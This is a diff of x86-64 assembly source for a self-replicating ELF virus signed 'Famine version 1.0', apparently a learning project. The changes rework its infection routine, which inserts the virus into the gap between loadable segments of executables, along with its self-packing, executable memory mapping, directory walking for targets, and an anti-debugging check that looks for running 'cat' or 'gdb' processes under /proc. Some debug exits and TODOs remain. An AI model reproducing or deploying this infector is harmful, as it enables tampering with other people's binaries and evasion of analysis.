@@ -17,6 +17,12 @@ section.text:
 ; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific order
 ; (make sense with syscall)
 
+_params:
+	length dq 0x0
+	vaddr dq 0x0
+	entry_inject dq 0x0
+	entry_prg dq 0x0
+
 _start:
 	call _inject; push addr to stack
 %ifdef DEBUG; ==================================================================
@@ -56,25 +62,18 @@ ret
 
 %endif; ========================================================================
 
-_inject:
-	; check for process running
-	lea rdi, [rel process_dir]
-	push 1
-	pop rsi ; mode for move_through_dir
+signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
-	call _move_through_dir
+_inject:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
-
-	cmp rax, 0x0
-	jne _end
+	; r8 contains the entry of the virus
 
 	%ifdef DEBUG
 		mov rdi, r8
 		add rdi, 0x5; sub call instr
 		call _print; _print(rdi)
 	%endif
-	; r8 contains the entry of the virus
 
 	; copy the prg in memory and launch it
 	xor rax, rax; = 0
@@ -92,7 +91,9 @@ _inject:
 		; copy the virus into a mmap executable
 		xor rdi, rdi; NULL
 
-		mov rsi, [rel length]
+		lea rsi, [rel _eof]
+		lea r8, [rel _params]
+		sub rsi, r8
 		push 7
 		pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
 		push 34
@@ -105,12 +106,11 @@ _inject:
 		syscall
 
 		push rsi; save length
-
 ; ==
 ;		memcpy(void *dst, void *src, size_t len)
 		push rax
 		pop rdi ; addr
-		lea rsi, [rel _start]
+		lea rsi, [rel _params]
 		lea rdx, [rel _packed_part]
 		sub rdx, rsi
 		call _ft_memcpy
@@ -119,16 +119,17 @@ _inject:
 ;		unpack(void *dst, void *src, size_t len)
 		add rdi, rdx
 		add rsi, rdx
-		lea rdx, [rel _end_of_pack]
-		sub rdx, rsi
+		mov rax, [rel length]
+		sub rax, rdx; length - [packed_part - params]
+		push rax
+		pop rdx
+; = DEBUG
+;		mov rdi, rdx
+;		mov rax, 60
+;		syscall
+; =
+
 		call _unpack
-; ==
-;		memcpy(void *dst, void *src, size_t len)
-		add rdi, rdx
-		add rsi, rdx
-		lea rdx, [rel _eof]
-		sub rdx, rsi
-		call _ft_memcpy
 
 		push r9
 		pop rdi
@@ -139,7 +140,7 @@ _inject:
 
 		push rsi ; save length
 
-		lea rsi, [rel _start]
+		lea rsi, [rel _params]
 		lea rax, [rel _search_dir]
 		sub rax, rsi
 		add rax, rdi
@@ -179,7 +180,7 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 		xor rax, rax
 		cmp rcx, r11
 		jge .end_loop
-		cmp byte[r10 + rcx], 242
+		cmp byte[r10 + rcx], 244
 		je .uncompress_char
 			mov al, [r10 + rcx]
 			mov [r9 + r8], al
@@ -187,7 +188,7 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 			inc r8
 		jmp .loop_uncompress
 		.uncompress_char:
-; == TODO: Don't know if this works
+; == Seems to works
 			inc rcx
 			mov rdi, r9
 			add rdi, r8
@@ -219,9 +220,36 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 	pop r8
 ret
 
+_ft_memcpy: ; (string rdi, string rsi, size_t rdx)
+	push rcx
+
+	xor rax, rax
+	xor rcx, rcx
+	.loop_byte:
+		cmp rcx, rdx
+		je .return
+		mov al, [rsi + rcx]
+		mov [rdi + rcx], al
+		inc rcx
+	jmp .loop_byte
+	.return:
+		mov rax, rdi
+
+	pop rcx
+ret
+
 ; ============================================================== pack from there
 _packed_part:
 _search_dir:
+	; check for process running
+	push 1
+	pop rsi ; mode for move_through_dir
+	lea rdi, [rel process_dir]
+
+	call _move_through_dir
+
+	cmp rax, 0x0
+	jne .return
 	xor rsi, rsi ; mode for move_through_dir
 	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
@@ -234,6 +262,7 @@ _search_dir:
 	inc rcx
 	cmp byte[rdi + rcx], 0x0
 	jnz .loop_array_string
+	.return:
 ret
 
 _end:
@@ -248,8 +277,25 @@ _end:
 	sub rax, [rel entry_inject]
 	add rax, [rel vaddr]
 
+; = DEBUG
+	mov rdi, [rel entry_prg]
+	mov rax, 11
+	syscall
+; =
+
+	mov rax, 60
+	syscall
+
 	add rax, [rel entry_prg]
 	sub rax, [rel vaddr]
+
+; = DEBUG
+	mov rdi, rax
+	push rax
+	mov rax, 9
+	syscall
+	pop rax
+; =
 
 	jmp rax
 
@@ -536,16 +582,19 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rsi, [rbx + 56 + 8] ; next->p_offset
 			sub rsi, rdi
 
+			add rdi, 8 * 4 ; let space for params
+
+			; host
+			lea rdx, [rel _eof]
+			lea r9, [rel _params]
+			sub rdx, r9
+			cmp rsi, rdx
+			jl .unmap ; if size between PT_LOAD isn't enough -> abort
+
 			xor r9, r9
 			cmp r9, [rel entry_inject]
 			jne .infected
 
-			; host
-			lea rdx, [rel _eof]
-			lea r9, [rel _start]
-			sub rdx, r9
-			cmp rsi, rdx
-			jl .unmap ; if size between PT_LOAD isn't enough -> abort
 			; ==		copy start of the virus
 			add rdi, r13 ; addr pointer -> mmap
 			mov rax, rdi
@@ -553,7 +602,7 @@ _infect_file: ; (string rdi, stat rsi)
 
 			lea rsi, [rel _start]
 			lea rdx, [rel _packed_part]
-			sub rdx, r9
+			sub rdx, rsi
 			call _ft_memcpy
 
 			; ==		pack a part
@@ -562,45 +611,40 @@ _infect_file: ; (string rdi, stat rsi)
 			push rax
 			pop r9
 
-			; ==		copy end
-			lea rsi, [rel _end_of_pack]
-			add rdi, r9
-			lea rdx, [rel _eof]
-			sub rdx, rsi
-			sub rdx, 8 * 4; params
-			call _ft_memcpy
-
 			; ==		change rdx, rax, rdi
-			push rcx; save
-			mov rcx, rdx
-			push rdi
+; TODO: delete
+;			push rdi
 			add rdx, r9
-			lea rax, [rel _packed_part]
-			lea r9, [rel _start]
-			sub rax, r9
-			add rdx, rax
-			pop rax
-			add rax, rcx; end
-			pop rcx; recover
+;			lea rax, [rel _packed_part]
+;			lea r9, [rel _start]
+;			sub rax, r9
+;			add rdx, rax
+;			pop rax
+;			add rax, rcx; end
 			pop rdi; mmap
+			mov rax, rdi
 
 			jmp .params
 
 			.infected:
 			; TODO: CA NE MARCHERA JAAAMMAAAIIISS
 			mov rdx, [rel length]
-			; copy virus
 			sub rdx, 8 * 4
+			; copy virus
 			add rdi, r13 ; addr pointer -> mmap
+			mov rax, rdi
+			push rax
+			add rdi, 8 * 4
 			mov rsi, r8
 			call _ft_memcpy
-			add rax, rdx ; go to the end
+			pop rdi
+			mov rax, rdi
 
 			.params:
 			; add _params
+			sub rax, 8 * 4
 			add rdx, 8 * 4
 			mov [rax], rdx ; length
-
 			add rax, 8
 			mov rsi, [rbx + 16]
 			mov [rax], rsi ; vaddr
@@ -854,24 +898,6 @@ _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 	pop r8
 ret
 
-_ft_memcpy: ; (string rdi, string rsi, size_t rdx)
-	push rcx
-
-	xor rax, rax
-	xor rcx, rcx
-	.loop_byte:
-		cmp rcx, rdx
-		je .return
-		mov al, [rsi + rcx]
-		mov [rdi + rcx], al
-		inc rcx
-	jmp .loop_byte
-	.return:
-		mov rax, rdi
-
-	pop rcx
-ret
-
 _ft_strcmp: ; (string rdi, string rsi)
 	push rdx
 
@@ -925,20 +951,12 @@ elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, 0x0
 %endif
 
-; ===================================================================end of pack
-_end_of_pack:
 	process_dir db `/proc`, 0x0
 	process_status db `status`, 0x0
 	process db `\tcat\n`, 0x0, `\tgdb\n`, 0x0, 0x0
 
-	signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
-
-_params:
-	length dq 0x0
-	vaddr dq 0x0
-	entry_inject dq 0x0
-	entry_prg dq 0x0
-
+; ===================================================================end of pack
+_end_of_pack:
 _eof:
 
 ; don't need to copy the host part
@@ -1013,7 +1031,7 @@ _pack: ;(void *rdi) -> ret size + fill rdi
 		je .not_compress_char
 		cmp rbx, 4; && k >= 4) {
 		jl .not_compress_char
-		mov byte[rdi + r8], 242; addr[l] = 242
+		mov byte[rdi + r8], 244; addr[l] = 244
 		inc r8; l++
 		mov rax, r10
 		sub rax, r12
